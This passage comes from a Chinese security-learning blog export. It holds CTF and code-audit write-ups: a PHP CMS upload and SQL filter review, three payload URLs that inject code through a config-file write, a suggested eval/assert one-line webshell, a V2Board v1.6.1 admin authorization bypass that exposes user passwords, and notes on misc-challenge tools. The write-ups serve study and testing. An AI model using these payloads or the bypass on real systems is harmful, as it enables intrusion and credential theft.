class="line">            <span class="comment">/*bin2hex —将二进制数据转换为十六进制表示*/</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// 取全部</span></span><br><span class="line">            <span class="variable">$hexCode</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">fread</span>(<span class="variable">$resource</span>, <span class="variable">$fileSize</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$resource</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/(3c25.*?28.*?29.*?253e)|(3c3f.*?28.*?29.*?3f3e)|(3C534352495054)|(2F5343524950543E)|(3C736372697074)|(2F7363726970743E)/is&quot;</span>,<span class="variable">$hexCode</span>))</span><br><span class="line">        <span class="comment">/*匹配16进制中一句话木马中特征编码</span></span><br><span class="line"><span class="comment">        过滤</span></span><br><span class="line"><span class="comment">        &lt;%()%&gt;</span></span><br><span class="line"><span class="comment">        &lt;?()?&gt;</span></span><br><span class="line"><span class="comment">        &lt;script&gt;()&lt;/script&gt;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        &#123;</span><br><span class="line">        	<span class="comment">//删除文件</span></span><br><span class="line">        	<span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*也就是把图片以二进制方式读取的数据再进行十六进制转化，最后进行正则匹配过滤，看来绕过确实不容易*/</span></span><br></pre></td></tr></table></figure>

<p>正常上传图片，</p>
<p><img src="/2022/11/22/SYC/image-20221122152819257.png" alt="image-20221122152819257"></p>
<p>成功</p>
<p><img src="/2022/11/22/SYC/image-20221122154113084.png" alt="image-20221122154113084"></p>
<p>而且还回显了图片上传的路径</p>
<p>试试能不能访问</p>
<p><img src="/2022/11/22/SYC/image-20221122162549084.png" alt="image-20221122162549084"></p>
<p>发现是可以访问这个目录下的图片文件的</p>
<p>但当我在这个路径目录直接放了脚本文件，再访问时</p>
<p><img src="/2022/11/22/SYC/image-20221122165943218.png" alt="image-20221122165943218"></p>
<p>发现被阻止了，也就是<code>apchae</code>在这个<strong>图片存储目录设置了脚本文件的访问权限禁止，那么就无法利用在这个目录下的脚本文件</strong></p>
<p>所以，要么修改上传的路径，比如到网站的自身脚本目录下，进行访问执行</p>
<hr>
<h5 id="小说"><a href="#小说" class="headerlink" title="小说"></a>小说</h5><p>抓包小说，发现绕过了字数过少的限制，而且也绕过了小说后台审核</p>
<p><img src="/2022/11/22/SYC/image-20221122222054711.png" alt="image-20221122222054711"></p>
<p>我们抓包修改的内容没有经过后台直接到了存储目录</p>
<p><img src="/2022/11/22/SYC/image-20221122222413963.png" alt="image-20221122222413963"></p>
<p>后面发现是由于源码中，对签约用户自动审核通过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sys/apps/controllers/author/Bookchapter.php</span></span><br><span class="line">            <span class="comment">//判断签约，签约用户自动审核</span></span><br><span class="line">            <span class="variable">$signing</span> = <span class="title function_ invoke__">getzd</span>(<span class="string">&#x27;user&#x27;</span>,<span class="string">&#x27;signing&#x27;</span>,<span class="variable">$uid</span>);</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;yid&#x27;</span>] = <span class="variable">$signing</span> == <span class="number">1</span> ? <span class="number">0</span> : <span class="number">1</span>;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;bid&#x27;</span>] = <span class="variable">$bid</span>;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;addtime&#x27;</span>] = <span class="title function_ invoke__">time</span>();</span><br></pre></td></tr></table></figure>

<p>其中主要对动漫和小说名字，以及评论处还进行了<code>sql</code>注入限制</p>
<p><img src="/2022/11/22/SYC/image-20221123201716429.png" alt="image-20221123201716429"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sys/apps/helpers/common_helper.php</span></span><br><span class="line"><span class="comment">//SQL过滤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_replace</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$string</span>)) &#123;</span><br><span class="line">		<span class="keyword">foreach</span>(<span class="variable">$string</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">			<span class="variable">$string</span>[<span class="title function_ invoke__">safe_replace</span>(<span class="variable">$k</span>)] = <span class="title function_ invoke__">safe_replace</span>(<span class="variable">$v</span>); </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$string</span>))&#123;</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;%20&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;%27&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;%2527&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;&amp;#039;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;&amp;lt;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&amp;gt;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;\%&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_encode</span>(<span class="variable">$string</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也对一定时间内更新数也有限制，所以如果想利用签约作者账号爆库还是有点难</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sys/apps/controllers/author/Bookchapter.php   </span></span><br><span class="line">           <span class="comment">//判断五分钟内更新数量</span></span><br><span class="line">           <span class="variable">$time</span> = <span class="title function_ invoke__">time</span>()-<span class="number">300</span>;</span><br><span class="line">           <span class="variable">$mnum</span> = <span class="variable language_">$this</span>-&gt;mcdb-&gt;<span class="title function_ invoke__">get_nums</span>(<span class="variable">$table</span>,<span class="keyword">array</span>(<span class="string">&#x27;bid&#x27;</span>=&gt;<span class="variable">$bid</span>,<span class="string">&#x27;addtime&gt;&#x27;</span>=&gt;<span class="variable">$time</span>));</span><br><span class="line">           <span class="keyword">if</span>(<span class="variable">$mnum</span> &gt; <span class="number">5</span>) <span class="title function_ invoke__">get_json</span>(<span class="string">&#x27;系统检测到你有非法暴库行为~！&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/22/SYC/image-20221123123229249.png" alt="image-20221123123229249"></p>
<p>但是其对上传文件进行都默认为<code>txt</code>文件</p>
<p>而且对类似<code>&lt;&gt;</code>特殊符号也进行了编译</p>
<p><img src="/2022/11/22/SYC/image-20221124133546733.png" alt="image-20221124133546733"></p>
<p><img src="/2022/11/22/SYC/image-20221124133558480.png" alt="image-20221124133558480"></p>
<p>稍微看看小说文本文件生成的代码流程</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sys/apps/controllers/author/Bookchapter.php</span></span><br><span class="line">        <span class="comment">//写入小说到TXT文本</span></span><br><span class="line">        <span class="title function_ invoke__">get_book_txt</span>(<span class="variable">$bid</span>,<span class="variable">$id</span>,<span class="variable">$text</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arr</span>[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&#x27;恭喜您，操作成功~!&#x27;</span>;</span><br><span class="line">        <span class="variable">$arr</span>[<span class="string">&#x27;url&#x27;</span>] = <span class="title function_ invoke__">get_url</span>(<span class="string">&#x27;author/bookchapter/index/&#x27;</span>.<span class="variable">$bid</span>);</span><br><span class="line">        <span class="title function_ invoke__">get_json</span>(<span class="variable">$arr</span>,<span class="number">1</span>);</span><br><span class="line"><span class="comment">/*这是把作者文章写入存储目录的代码*/</span></span><br></pre></td></tr></table></figure>

<p>跟进 <code>get_book_txt</code>函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sys/apps/helpers/common_helper.php</span></span><br><span class="line"><span class="comment">//获取小说txt文本</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_book_txt</span>(<span class="params"><span class="variable">$bid</span>,<span class="variable">$zid</span>,<span class="variable">$text</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$txt_file</span> = FCPATH.<span class="string">&#x27;caches/txt/&#x27;</span>.<span class="variable">$bid</span>.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$zid</span>.Mc_Book_Key).<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">    <span class="comment">/*这里修改了文本名字*/</span></span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$text</span>))&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">write_file</span>(<span class="variable">$txt_file</span>, <span class="variable">$text</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$txt_file</span>)) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="comment">/*这里就是对改文章是否重复的判断*/</span></span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$txt_file</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再跟进<code>write_file</code>函数</p>
<p>看看我们的文本是怎么写入文件的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//写文件</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write_file</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$data</span>, <span class="variable">$mode</span> = FOPEN_WRITE_CREATE_DESTRUCTIVE</span>)</span>&#123;</span><br><span class="line">	<span class="variable">$dir</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$path</span>);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$dir</span>)) <span class="title function_ invoke__">mkdirss</span>(<span class="variable">$dir</span>);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="variable">$fp</span> = @<span class="title function_ invoke__">fopen</span>(<span class="variable">$path</span>,<span class="variable">$mode</span>)) <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">	<span class="title function_ invoke__">flock</span>(<span class="variable">$fp</span>, LOCK_EX);</span><br><span class="line">	<span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$data</span>);</span><br><span class="line">	<span class="title function_ invoke__">flock</span>(<span class="variable">$fp</span>, LOCK_UN);</span><br><span class="line">	<span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">TRUE</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>原来是直接用<code>fwrite</code>写入文件，而字符开始就被<code>html</code>转义了，所以写入的结果肯定是转义后的结果</p>
<h4 id="猜测"><a href="#猜测" class="headerlink" title="猜测"></a>猜测</h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line">可能是存在参数变量可以被代码执行函数覆盖，再通过与其他参数结合，实现命令执行</span><br></pre></td></tr></table></figure>

<p>测试完成</p>
<h1 id="PHP写入配置文件的经典漏洞"><a href="#PHP写入配置文件的经典漏洞" class="headerlink" title="PHP写入配置文件的经典漏洞"></a>PHP写入配置文件的经典漏洞</h1><p>在一个比赛中了解到的一个漏洞，关键在于绕过函数从而包含</p>
<p><a href="https://bbs.zkaq.cn/t/6045.html">转载文章</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">`<span class="meta">&lt;?php</span>`</span><br><span class="line">`<span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;option&#x27;</span>])) <span class="keyword">die</span>();</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;option&#x27;</span>]);`</span><br><span class="line">`<span class="variable">$file</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./config.php&#x27;</span>);`</span><br><span class="line">`<span class="variable">$file</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;|\$option=\&#x27;.*\&#x27;;|&#x27;</span>, <span class="string">&quot;\$option=&#x27;<span class="subst">$str</span>&#x27;;&quot;</span>, <span class="variable">$file</span>);`</span><br><span class="line">`<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;./config.php&#x27;</span>, <span class="variable">$file</span>);</span><br></pre></td></tr></table></figure>


<p><code>config.php</code> 的内容如下:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;test&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>要求是要<code>getshell</code>,这个场景十分经典，常用在修改配置文件写入的时候。<br>此处不存在之前说的那个配置文件中用的是<code>”双引号”</code>引起任意代码执行的问题,这这里面用的是单引号,而且 <code>addslashes()</code>处理过了,看似很安全,但是对于脑子里有个黑洞的搞安全的人来讲,这个还真是有问题的.</p>
<h2 id="方法一-利用换行符来绕过正则匹配的问题"><a href="#方法一-利用换行符来绕过正则匹配的问题" class="headerlink" title="方法一,利用换行符来绕过正则匹配的问题"></a>方法一,利用换行符来绕过正则匹配的问题</h2><p>可以看到正则匹配的是以下内容:</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="symbol">$optio</span>n=<span class="string">&#x27;任意内容&#x27;</span></span><br></pre></td></tr></table></figure>


<p>任意内容里面是可以包含转移符 <code>\</code> 的,所以我们利用下面的方法:</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//127.0.0.1/index.php?option=a&#x27;;%0aphpinfo();//</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//127.0.0.1/index.php?option=a</span></span><br></pre></td></tr></table></figure>


<p>执行完第一个之后,<code>config.php</code>中的内容为:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;a\&#x27;;</span></span><br><span class="line"><span class="string">phpinfo();//&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>但是这样并没有办法执行<code>phpinfo()</code>,因为我们插入的 单引号 被转移掉了,所以<code>phpinfo()</code>还是在单引号的包裹之内.<br>我们在访问下面这个</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span>/index.php?option=a</span><br></pre></td></tr></table></figure>


<p>因为正则 <code>.*</code> 会匹配行内的任意字符无数次.所以 <code>\</code> 也被认为是其中的一部分,也会被替换掉,执行完之后,<code>config.php</code>中的内容为:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();<span class="comment">//&#x27;;</span></span><br></pre></td></tr></table></figure>


<p>转义符就被替换掉了,就成功的<code>getshell</code>.</p>
<h2 id="方法二-利用-preg-replace函数的问题"><a href="#方法二-利用-preg-replace函数的问题" class="headerlink" title="方法二,利用 preg_replace函数的问题:"></a>方法二,利用 preg_replace函数的问题:</h2><p>用<code>preg_replace()</code>的时候<code>replacement(第二个参数)</code>也要经过正则引擎处理，所以正则引擎把<code>\\</code>转义成了<code>\</code><br>也就是说如果字符串是<code>\\\&amp;#39;</code>,经过 <code>preg_replace()</code>的处理,就变为 <code>#39;</code>,单引号就逃出来了.<br>所以<code>payload</code>如下:</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/index.php?option=a\&#x27;;phpinfo();/</span><span class="regexp">/</span></span><br></pre></td></tr></table></figure>


<p><code>config.php</code>变为:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;a\\&#x27;</span>;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">//&#x27;;</span></span><br></pre></td></tr></table></figure>

<p>**道理就是  <code>a\&amp;#39;;phpinfo();//</code>  经过 <code>addslashes()</code>处理之后,变为<code>a\\\&amp;#39;;phpinfo();//</code> 然后两个反斜杠被<code>preg_replace</code>变成了一个,导致单引号逃脱.</p>
<h2 id="方法三-利用-preg-replace-函数的第二个参数的问题"><a href="#方法三-利用-preg-replace-函数的第二个参数的问题" class="headerlink" title="方法三, 利用 preg_replace() 函数的第二个参数的问题"></a>方法三, 利用 preg_replace() 函数的第二个参数的问题</h2><p>先看官方对<code>preg_replace()</code>函数的描述<code>manual</code><br>函数原型:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">xed <span class="title function_ invoke__">preg_replace</span> ( <span class="keyword">mixed</span> <span class="variable">$pattern</span> , <span class="keyword">mixed</span> <span class="variable">$replacement</span> , <span class="keyword">mixed</span> <span class="variable">$subject</span> [, <span class="keyword">int</span> <span class="variable">$limit</span> = -<span class="number">1</span> [, <span class="keyword">int</span> &amp;<span class="variable">$count</span> ]] )</span><br></pre></td></tr></table></figure>


<p>对<code>replacement</code>的描述.<br><code>replacement</code>中可以包含后</p>
<p>向<code>引用\\n或(php 4.0.4以上可用)$n</code>，语法上首选后者。 每个 这样的引用将被匹配到的第<code>n</code>个捕获子组捕获到的文本替换。 <code>n</code> 可以是<code>0-99</code>，<code>\\0</code>和<code>$0</code>代表完整的模式匹配文本。</p>
<p>所以我们可以用:</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/test/</span>ph.php?option=;phpinfo();</span><br><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/test/</span>ph.php?option= 或者 http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/test/</span>ph.php?option=<span class="variable">$0</span></span><br></pre></td></tr></table></figure>


<p>执行第一条后<code>config.php</code>的内容为:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;;phpinfo();&#x27;</span>;</span><br></pre></td></tr></table></figure>


<p>再执行第二条后<code>config.php</code>的内容为:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;$option=&#x27;</span>;<span class="title function_ invoke__">phpinfo</span>();<span class="string">&#x27;;&#x27;</span>;</span><br></pre></td></tr></table></figure>


<p>刚好闭合掉了前后的两个单引号中间的逃脱出来了.想出这个办法的人,思路真是可以的.</p>
<hr>
<p>要<code>getshell</code>直接</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">把<span class="built_in">phpinfo</span>()替换成</span><br><span class="line"><span class="function"><span class="title">eval</span><span class="params">($_REQUEST[<span class="number">123</span>])</span></span></span><br><span class="line"><span class="function"><span class="title">assert</span><span class="params">($_REQUEST[<span class="number">123</span>])</span></span></span><br><span class="line">蚁剑连接即可</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="V2Board-v1-6-1-越权访问漏洞"><a href="#V2Board-v1-6-1-越权访问漏洞" class="headerlink" title="V2Board  v1.6.1 越权访问漏洞"></a>V2Board  v1.6.1 越权访问漏洞</h1><p>这是在某次比赛遇到的一道题，只拿了题目专门来记录这个漏洞，并没下载代码测试</p>
<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a><strong>漏洞描述</strong></h2><p><code>V2board</code>面板 <code>Admin.php</code> 存在越权访问漏洞，由于部分鉴权代码于<code>v1.6.1</code>版本进行了修改，鉴权方式变为从<code>Redis</code>中获取缓存判定是否存在可以调用接口，导致任意用户都可以调用管理员权限的接口获取后台权限</p>
<p>也就是说它是从缓存中来判断权限，一旦判断成功，就可以以<code>admin</code>身份去访问其他不可访问的敏感内容，比如<code>admin</code>的密码等等</p>
<h2 id="漏洞代码分析"><a href="#漏洞代码分析" class="headerlink" title="漏洞代码分析"></a>漏洞代码分析</h2><p>代码位置：<code>app/Http/Middleware/Admin.php</code></p>
<p><img src="/2022/11/22/SYC/image-20230113161644874.png" alt="image-20230113161644874"></p>
<p>这里的代码就是判断<code>redis</code>缓存中是否存在<code>authorization</code>，如果存在就允许调用<code>admin</code>的接口，所以一旦存在</p>
<p><code>authorization</code>就可以调用该接口，但是并没用进一步判断<code>authorization</code>中是否属于<code>admin</code></p>
<p>主要要通过两次逻辑实现验证，一个是存在 <code>header</code> 中的 <code>authorization</code> 参数，再一个是校验 <code>authorizations</code> 是否存在于<code>Redis</code>缓存中的</p>
<p>在返回包数据中，</p>
<p><img src="/2022/11/22/SYC/image-20230113165445597.png" alt="image-20230113165445597"></p>
<p>这里可以看到，这里在登录时会返回<code>token</code>，<code>auth_data</code></p>
<p>而<code>auth_data</code>和<code>authorization</code>两个格式都是一样的<code>base64_encode(&quot;username:password&quot;)</code></p>
<p>但是一个普通用户，一个管理员用户，这里就可能存在逻辑漏洞越权</p>
<h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><p>先进行注册一个普通权限的</p>
<p><img src="/2022/11/22/SYC/image-20230113161201687.png" alt="image-20230113161201687"></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">账号：<span class="symbol">123@</span>qq.com</span><br><span class="line">密码：<span class="number">123456789</span></span><br></pre></td></tr></table></figure>

<p>在登录时进行抓包</p>
<p>返回包会返回我们的<code>token</code>和<code>auth_data</code></p>
<p><img src="/2022/11/22/SYC/image-20230113165230066.png" alt="image-20230113165230066"></p>
<p>同时 <code>auth_data</code> 会缓存于 <code>Redis</code> 中</p>
<p>但是还是需要把这个<code>auth_data</code>写进<code>authorization</code></p>
<p>如果不写入直接访问<code>/admin</code>就会弹出禁止，因为在缓存中普通用户的数据是以<code>auth_data</code>，</p>
<p><img src="/2022/11/22/SYC/image-20230113171237926.png" alt="image-20230113171237926"></p>
<p>所以通过下面访问<code>/api/v1/user/info</code>，当然访问其他位置也可以，只要能把<code>authorization</code>参数把普通用户数据添加到请求体中，并且成功发送</p>
<p>从而普通用户的数据也以<code>authorization</code>参数形式保存到<code>redis</code>缓存中去了</p>
<p><img src="/2022/11/22/SYC/image-20230113172957033.png" alt="image-20230113172957033"></p>
<p>如何我们就可以访问<code>admin</code>才可以访问的信息</p>
<p>比如<code>/api/v1/admin/user/fetch</code>，这就是以<code>admin</code>查看访问<code>user</code>的信息</p>
<p><img src="/2022/11/22/SYC/image-20230113180827350.png" alt="image-20230113180827350"></p>
<p>成功访问</p>
<p>并且得到<code>email</code>,<code>password</code>,<code>token</code>等信息</p>
<p><img src="/2022/11/22/SYC/image-20230113180921938.png" alt="image-20230113180921938"></p>
<p>测试完成</p>
]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
      <tags>
        <tag>实战</tag>
      </tags>
  </entry>
  <entry>
    <title>密码+杂项题简单记录</title>
    <url>/2022/09/27/crypto+misc/</url>
    <content><![CDATA[<p><code>只会web，得分太少，还是搞点密码和杂项来提高一下</code></p>
<span id="more"></span>

<h2 id="1-一般加密"><a href="#1-一般加密" class="headerlink" title="1.一般加密"></a>1.一般加密</h2><figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">直接用kali的</span><br><span class="line"></span><br><span class="line">ciphey -<span class="built_in">t</span> <span class="string">&quot;xxx&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="2-SSTV图像声音-x2F-Audacity波形声音"><a href="#2-SSTV图像声音-x2F-Audacity波形声音" class="headerlink" title="2.SSTV图像声音&#x2F;Audacity波形声音"></a>2.SSTV图像声音&#x2F;Audacity波形声音</h2><figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">用wi<span class="symbol">n10</span>上</span><br><span class="line"></span><br><span class="line">MMSSTV工具解析声音，最好用虚拟声卡这样可以屏蔽一些杂音【把声音给MMSSTV听】</span><br><span class="line"></span><br><span class="line">Audacity解析声音波形得到波形图像从而得到flag</span><br></pre></td></tr></table></figure>

<h2 id="3-加密压缩包"><a href="#3-加密压缩包" class="headerlink" title="3.加密压缩包"></a>3.加密压缩包</h2><h3 id="1）win10"><a href="#1）win10" class="headerlink" title="*1）win10"></a>*1）win10</h3><p>用<code>win10</code>工具爆破压缩包密码</p>
<h3 id="2）kali"><a href="#2）kali" class="headerlink" title="2）kali"></a>2）kali</h3><p><code>kali john</code>爆破压缩包</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">zip2john 压缩包的名字<span class="string">.zip</span> &gt;&gt; passwdhash.txt</span><br></pre></td></tr></table></figure>

<h2 id="4-图片隐写"><a href="#4-图片隐写" class="headerlink" title="4.图片隐写"></a>4.图片隐写</h2><h3 id="1）win10-1"><a href="#1）win10-1" class="headerlink" title="1）win10"></a>1）win10</h3><p>利用<code>Stegsolve</code>解析图片隐写内容</p>
<h3 id="2）kali-1"><a href="#2）kali-1" class="headerlink" title="*2）kali"></a>*2）kali</h3><p><code>zsteg</code></p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">zsteg</span> 图片</span><br></pre></td></tr></table></figure>

<h2 id="5-零宽字符隐写"><a href="#5-零宽字符隐写" class="headerlink" title="5.零宽字符隐写"></a>5.零宽字符隐写</h2><p><a href="http://330k.github.io/misc_tools/unicode_steganography.html">http://330k.github.io/misc_tools/unicode_steganography.html</a></p>
<p>我们开始看这个内容是没有什么问题的，但是底下的</p>
<p><code>第7行，第204列</code></p>
<p>说明里面有其他我们无法看到的字符存在</p>
<p><img src="/2022/09/27/crypto+misc/image-20220927160630959.png" alt="image-20220927160630959"></p>
<p>我们可以利用<code>vim</code>读取一下这个文本文件，就会发现里面多了很多奇奇怪怪的字符</p>
<p><img src="/2022/09/27/crypto+misc/image-20220927160526722.png" alt="image-20220927160526722"></p>
<p>这些就是<code>零宽字符</code></p>
<p>那么我们如何从中读取信息呢</p>
<p>这里就需要下面这个网站的，对文本的<code>零宽字符加密</code>和<code>零宽字符解密</code>功能</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">330</span>k.github.io<span class="regexp">/misc_tools/u</span>nicode_steganography.html</span><br></pre></td></tr></table></figure>

<p>先选好出现的字符类型</p>
<p><img src="/2022/09/27/crypto+misc/image-20220927161233239.png" alt="image-20220927161233239"></p>
<p>然后</p>
<p><img src="/2022/09/27/crypto+misc/image-20220927161257809.png" alt="image-20220927161257809"></p>
<p>得到隐藏内容</p>
